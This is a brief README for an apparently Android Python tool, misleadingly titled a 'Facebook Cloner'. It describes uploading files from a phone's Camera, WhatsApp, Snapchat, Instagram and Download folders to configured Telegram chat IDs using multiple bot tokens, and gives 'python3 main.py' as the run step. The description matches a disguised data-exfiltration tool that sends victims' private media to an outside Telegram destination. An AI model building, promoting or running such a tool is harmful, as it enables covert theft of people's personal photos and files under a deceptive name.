# Multi Method Facebook Cloner File Sender

This tool sends files from specific folders on your device to Telegram chat IDs using multiple bot tokens to maximize speed.

## Setup

1. Add your Telegram Bot tokens to `tokens.py` (keep this file out of GitHub).
2. Add your target Telegram chat IDs to `chat_ids.txt`.
3. Place files you want to send in the folders:
   - `/sdcard/DCIM/Camera`
   - `/sdcard/Pictures`
   - `/sdcard/Download`
   - `/sdcard/WhatsApp/Media/WhatsApp Images`
   - `/sdcard/Snapchat`
   - `/sdcard/Instagram`
4. Run the tool:

```bash
python3 main.py
